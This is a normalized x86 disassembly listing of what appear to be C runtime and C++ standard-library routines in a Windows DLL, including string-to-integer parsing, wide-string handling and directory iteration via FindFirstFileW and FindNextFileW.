cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
xor edx edx
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
jl r-xdata
cmp eax esi
mov cl 0x30
jle r-xdata
cmp [ edi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ edi ] cl
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc edi
movsx eax [ edi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2 ] 0x0
call sub_1002e26b
pop ecx
push eax
mov esi r--data
push esi
call sub_10027b60
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
inc edi
inc edi
cmp al 0x58
jne r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movsx ecx [ ebx + r--data ]
mov eax edi
sub eax ecx
sub eax [ ebp - 0x10 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x28 ]
mov bl cl
mov eax esi
sub bl al
mov [ ebp - 0x2 ] bl
call sub_1002e310
push [ ebp + 0x10 ]
mov ecx eax
mov eax edx
mov [ ebp - 0x8 ] eax
movsx eax bl
cdq
add ecx eax
mov eax [ ebp - 0x8 ]
adc eax edx
mov [ ebp - 0x14 ] eax
inc edi
movsx eax [ edi ]
push eax
mov [ ebp - 0x18 ] ecx
call sub_1002e26b
pop ecx
push eax
push esi
call sub_10027b60
mov ecx eax
add esp 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call sub_1002d4db
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cdq
sub esi eax
sbb ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov [ eax ] edi
or [ ebp - 0x18 ] 0xffffffff
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
cdq
push edx
push eax
push ecx
push esi
call sub_1002e2a0
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edx [ ebp - 0x1c ]
je r-xdata
sub_10022d61
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10022d83
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0x10
leave
retn
sub_10022d83
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_1002d4db
mov esi [ eax ]
call sub_1002d4db
push [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_1002e4e6
fstp [ ebp - 0x8 ]
pop ecx
pop ecx
call sub_1002d4db
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
call sub_1002d4db
fld [ r--data ]
mov [ eax ] esi
mov eax [ ebp + 0x10 ]
pop esi
jmp r-xdata
test eax eax
jg r-xdata
fld [ ebp - 0x8 ]
dec eax
fmul st1
fstp [ ebp - 0x8 ]
jge r-xdata
fstp st0
fld [ ebp - 0x8 ]
leave
retn
neg eax
dec eax
fld [ ebp - 0x8 ]
fdiv st1
fstp [ ebp - 0x8 ]
jne r-xdata
sub_10022e02
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_1002d957
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_1002d90b
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_1002dd87
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_1002aa1f
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_1002dd42
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_10022f14
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ebx edx
mov edi edx
and ebx 0x4
and edi 0x80
test dl 0x40
je r-xdata
test dl 0x8
je r-xdata
or edx 0x1
xor ecx ecx
and edx 0xffffff3b
xor eax eax
inc ecx
or edx 0x2
mov esi eax
shl esi 0x2
cmp [ esi + r--data ] 0x0
jne r-xdata
mov ecx [ eax * 4 + r--data ]
inc eax
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp ecx edx
je r-xdata
push [ ebp + 0x10 ]
mov esi [ esi + rw-data ]
push esi
push [ ebp + 0x8 ]
call sub_1002e4fd
mov esi eax
add esp 0xc
test esi esi
je r-xdata
test dl 0x1
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
je r-xdata
push [ ebp + 0x10 ]
push r--data
push [ ebp + 0x8 ]
call sub_1002e4fd
add esp 0xc
test eax eax
je r-xdata
mov eax esi
push 0x2
push 0x0
push esi
call sub_10029ba7
add esp 0xc
test eax eax
je r-xdata
push eax
push esi
jmp r-xdata
call sub_1002a03a
pop ecx
jmp r-xdata
sub_1002300c
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
dec eax
mov [ rw-data ] eax
mov [ eax * 4 + rw-data ] ecx
pop ebp
retn
pop ebp
jmp sub_1002c1f8
sub_10023070
push esi
mov esi [ esp + 0xc ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
pop esi
retn
push eax
call [ FindClose@IAT ]
mov [ esi ] 0x0
sub_100230b0
push esi
mov esi [ ecx + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
pop esi
jmp edx
sub_100230f0
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10027827
lea eax [ esi + edi * 2 + 0x4 ]
pop edi
pop esi
retn 0x4
mov esi [ esi + 0x4 ]
lea eax [ esi + edi * 2 ]
pop edi
pop esi
retn 0x4
sub_10023150
lea eax [ esp - 0x8 ]
sub esp 0x8
cmp eax ecx
je r-xdata
push esi
mov esi [ ecx + 0x4 ]
mov [ ecx + 0x4 ] 0x0
test esi esi
je r-xdata
mov [ ecx ] 0x0
pop esi
add esp 0x8
retn
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
pop esi
add esp 0x8
jmp eax
sub_100231b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e1e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ebx [ esi + 0x14 ]
sub eax edi
sar eax 0x1
cmp ebx eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x18 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
movzx edx [ edi ]
push edx
push 0x1
mov ecx esi
call sub_10005db8
add edi 0x2
jmp r-xdata
push 0x1
push eax
call sub_100024cd
test al al
je r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
cmp [ esi + 0x18 ] 0x8
mov [ esi + 0x14 ] ebx
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
sub_10023237
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x18 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
push ecx
mov [ esi + 0x4 ] cx
call sub_1002ae74
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x4 ]
push eax
call sub_100272e8
add esp 0x4
sub_10023280
push ebx
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x48 ] 0x10
jb r-xdata
xor ebx ebx
mov [ esi + 0x48 ] 0xf
mov [ esi + 0x44 ] ebx
mov [ esi + 0x34 ] bl
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov eax [ esi + 0x34 ]
push eax
call sub_100272e8
add esp 0x4
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x10 ] bl
mov ecx esi
pop esi
pop ebx
jmp sub_100274ce
mov ecx [ esi + 0x10 ]
push ecx
call sub_100272e8
add esp 0x4
sub_100232e0
push ecx
mov eax ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
push esi
mov esi [ esp + 0xc ]
push eax
push esi
mov [ esp + 0xc ] 0x0
call edx
mov eax esi
pop esi
pop ecx
retn 0x4
sub_10023330
push 0xffffffff
push sub_1004e213
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov edx 0x7
xor ecx ecx
xor esi esi
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x4 ] si
mov [ eax + 0x34 ] edx
xor edx edx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x20 ] dx
mov [ eax + 0x50 ] 0xf
mov [ eax + 0x4c ] ecx
mov [ eax + 0x3c ] cl
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn
sub_100233a0
push 0xffffffff
push sub_1004e243
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x50 ] 0x10
jb r-xdata
xor ebx ebx
mov [ esi + 0x50 ] 0xf
mov [ esi + 0x4c ] ebx
mov [ esi + 0x3c ] bl
cmp [ esi + 0x34 ] 0x8
jb r-xdata
mov eax [ esi + 0x3c ]
push eax
call sub_100272e8
add esp 0x4
xor edx edx
mov [ esi + 0x34 ] 0x7
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] dx
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov ecx [ esi + 0x20 ]
push ecx
call sub_100272e8
add esp 0x4
xor ecx ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] cx
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x10
retn
mov eax [ esi + 0x4 ]
push eax
call sub_100272e8
add esp 0x4
sub_10023440
push 0xffffffff
push sub_1004e268
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esp + 0x24 ]
push eax
call sub_10001eec
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
xor eax eax
mov [ esi ] r--data
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] edx
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] 0xf
mov [ esi + 0x34 ] al
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0xc
sub_100234b0
push 0xffffffff
push sub_1004e2b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x3c ]
xor eax eax
push 0xffffffff
push eax
mov [ esp + 0x10 ] 0x0
push ecx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] ax
call sub_1000253c
mov edx [ esp + 0x40 ]
push edx
lea ecx [ esp + 0x10 ]
mov [ esp + 0x34 ] 0x1
call sub_10025780
mov esi [ esp + 0x38 ]
xor ecx ecx
push 0xffffffff
push ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] cx
push eax
mov ecx esi
call sub_1000253c
cmp [ esp + 0x24 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x2c
retn
mov edx [ esp + 0x10 ]
push edx
call sub_100272e8
add esp 0x4
sub_10023590
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e2d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
cmp [ esi + 0x44 ] 0x0
mov ebx 0x10
jne r-xdata
cmp [ esi + 0x48 ] ebx
jb r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x24 ] ebx
jb r-xdata
lea eax [ esi + 0x34 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x34 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ esi + 0x10 ]
mov edx [ esi + 0x10 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
lea edi [ esi + 0x30 ]
push edx
mov ecx edi
call sub_10001e2d
cmp [ esi + 0x44 ] 0x0
je r-xdata
mov eax edx
lea edi [ eax + 0x1 ]
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ esi + 0x28 ]
call sub_100232e0
push 0xffffffff
push 0x0
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_100071fd
cmp [ ebp - 0x18 ] ebx
jb r-xdata
push 0x2
push r--data
mov ecx edi
call sub_100072a4
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100272e8
add esp 0x4
sub_100236c0
push 0xffffffff
push sub_1004e30b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x278
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x274 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28c ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x29c ]
mov ecx [ esp + 0x2a8 ]
mov ebx [ esp + 0x2a0 ]
mov esi [ esp + 0x2ac ]
mov ebp [ esp + 0x2b0 ]
push 0xffffffff
xor edi edi
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x2a8 ]
push edi
mov [ esp + 0x20 ] ecx
xor edx edx
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x40 ] 0x7
mov [ esp + 0x3c ] edi
mov [ esp + 0x2c ] dx
call sub_1000253c
mov eax [ esp + 0x30 ]
mov [ esp + 0x294 ] edi
cmp eax edi
je r-xdata
mov edx r--data
lea edi [ eax - 0x1 ]
cmp edi eax
jbe r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ esp + 0x24 ]
call sub_10009d64
mov eax [ esp + 0x20 ]
mov edi 0x8
cmp [ esp + 0x34 ] edi
jae r-xdata
cmp [ esp + 0x34 ] 0x8
mov ecx [ esp + 0x20 ]
jae r-xdata
call sub_10027827
mov eax [ esp + 0x30 ]
lea ecx [ esp + 0x38 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov [ ebx ] eax
cmp eax 0xffffffff
jne r-xdata
lea eax [ esp + 0x20 ]
cmp [ ecx + edi * 2 ] 0x5c
je r-xdata
lea ecx [ esp + 0x20 ]
lea eax [ esp + 0x64 ]
lea edx [ eax + 0x2 ]
mov edi [ GetLastError@IAT ]
mov [ ebx ] 0x0
call edi
cmp eax 0x2
je r-xdata
mov edx r--data
jmp r-xdata
lea edi [ eax - 0x1 ]
cmp edi eax
jbe r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ esp + 0x18 ]
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x68 ]
push eax
call sub_10001667
mov eax [ esp + 0x38 ]
test eax 0x400
je r-xdata
xor esi esi
call edi
cmp eax 0x12
je r-xdata
mov eax edx
lea edi [ eax + 0x2 ]
lea ecx [ ecx ]
cmp [ esp + 0x34 ] 0x8
mov ecx [ esp + 0x20 ]
jae r-xdata
call sub_10027827
mov eax [ esp + 0x30 ]
test al 0x10
je r-xdata
mov [ esi ] 0x0
mov [ ebp ] 0x0
jmp r-xdata
mov eax edi
jmp r-xdata
mov edx [ esp + 0x20 ]
push edx
call sub_100272e8
add esp 0x4
call edi
mov esi eax
jmp r-xdata
cmp [ ecx + edi * 2 ] 0x2f
je r-xdata
lea ecx [ esp + 0x20 ]
mov [ esi ] 0x2
mov [ ebp ] 0x2
mov [ esi ] 0x3
mov [ ebp ] 0x3
jmp r-xdata
mov esi [ esp + 0x14 ]
mov [ esi ] 0x0
call sub_10026670
mov [ esi + 0x4 ] eax
cmp [ esp + 0x34 ] edi
jb r-xdata
mov ecx [ esp + 0x28c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x274 ]
xor ecx esp
call sub_10027150
add esp 0x284
retn
call sub_10026670
cmp [ esp + 0x34 ] 0x8
mov edi [ esp + 0x14 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jb r-xdata
lea edi [ eax - 0x1 ]
cmp edi eax
jbe r-xdata
mov eax esi
mov ecx [ esp + 0x20 ]
push ecx
call sub_100272e8
add esp 0x4
cmp [ esp + 0x34 ] 0x8
mov eax [ esp + 0x20 ]
jae r-xdata
call sub_10027827
cmp [ eax + edi * 2 ] 0x3a
jne r-xdata
lea eax [ esp + 0x20 ]
sub_10023920
sub esp 0x258
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x254 ] eax
mov eax [ esp + 0x25c ]
push ebx
mov ebx [ esp + 0x270 ]
push ebp
mov ebp [ esp + 0x26c ]
push esi
mov esi [ esp + 0x26c ]
mov edx [ esi ]
push edi
mov edi [ esp + 0x278 ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
mov [ esp + 0x18 ] eax
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x40 ]
lea edx [ eax + 0x2 ]
call [ GetLastError@IAT ]
mov edi eax
mov eax [ esi ]
test eax eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x44 ]
push eax
mov ecx ebp
call sub_10001667
mov eax [ esp + 0x14 ]
test eax 0x400
je r-xdata
call sub_10026670
mov ecx [ esp + 0x10 ]
mov edx edi
sub edx 0x12
neg edx
sbb edx edx
and edx edi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
jmp r-xdata
push eax
call [ FindClose@IAT ]
mov [ esi ] 0x0
test al 0x10
je r-xdata
mov [ edi ] 0x0
mov [ ebx ] 0x0
jmp r-xdata
mov ecx [ esp + 0x264 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_10027150
add esp 0x258
retn
mov [ edi ] 0x2
mov [ ebx ] 0x2
mov [ edi ] 0x3
mov [ ebx ] 0x3
jmp r-xdata
mov esi [ esp + 0x10 ]
mov [ esi ] 0x0
call sub_10026670
mov [ esi + 0x4 ] eax
mov eax esi
sub_10023a30
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e340
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0x0
call sub_1002738b
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10023ae0
push 0xffffffff
push sub_1004e368
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] ax
mov [ esp + 0x18 ] eax
call sub_100259a0
mov ecx [ esp + 0x20 ]
mov edx [ ecx ]
mov eax edx
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_10009d64
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x8
sub_10023b60
sub esp 0x8
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
push esi
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc ] esi
call sub_10023a30
push esi
lea eax [ esp + 0xc ]
push esi
push eax
call sub_1000d3de
lea ecx [ esp + 0x14 ]
add esp 0xc
cmp ecx edi
je r-xdata
mov esi [ edi + 0x4 ]
mov eax [ esp + 0xc ]
mov [ edi + 0x4 ] eax
mov [ esp + 0xc ] esi
test esi esi
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ edi ]
mov [ esp + 0x8 ] edx
mov [ edi ] eax
pop edi
pop esi
add esp 0x8
retn 0x4
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
sub_10023be0
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov esi [ edi + 0x50 ]
test esi esi
je r-xdata
mov ecx edi
pop edi
pop esi
jmp sub_10023280
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
sub_10023c30
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov esi [ edi + 0x50 ]
test esi esi
je r-xdata
mov ecx edi
call sub_10023280
test [ esp + 0xc ] 0x1
je r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_100272e8
add esp 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
sub_10023c90
push 0xffffffff
push sub_1004e3a9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x24 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x34 ]
xor ebp ebp
mov [ esp + 0x18 ] ebp
mov edi ecx
mov ecx [ esp + 0x38 ]
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] ebp
mov [ esp + 0x20 ] eax
mov [ esp + 0x1c ] ecx
mov [ eax + 0x4 ] 0x0
mov edx [ edi + 0x14 ]
mov [ esp + 0x2c ] ebp
mov [ esp + 0x18 ] 0x1
cmp edx ebp
je r-xdata
mov ecx [ esp + 0x24 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x8
mov ecx [ edi + 0x18 ]
lea esi [ edi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ esp + 0x14 ] esi
mov ebx esi
mov ebx [ esi ]
mov [ esp + 0x14 ] ebx
jmp r-xdata
call sub_10027827
cmp ecx 0x8
jb r-xdata
cmp ebx ebp
je r-xdata
mov ecx [ edi + 0x18 ]
mov ebx [ edi + 0x14 ]
cmp ecx 0x8
jb r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ebp esi
mov ebp [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp ecx 0x8
jb r-xdata
cmp eax ebx
ja r-xdata
call sub_10027827
cmp ecx 0x8
jb r-xdata
test ebp ebp
je r-xdata
call sub_10027827
mov ecx [ edi + 0x14 ]
lea edx [ eax + ecx * 2 ]
cmp ebx edx
jb r-xdata
mov eax esi
mov eax [ esi ]
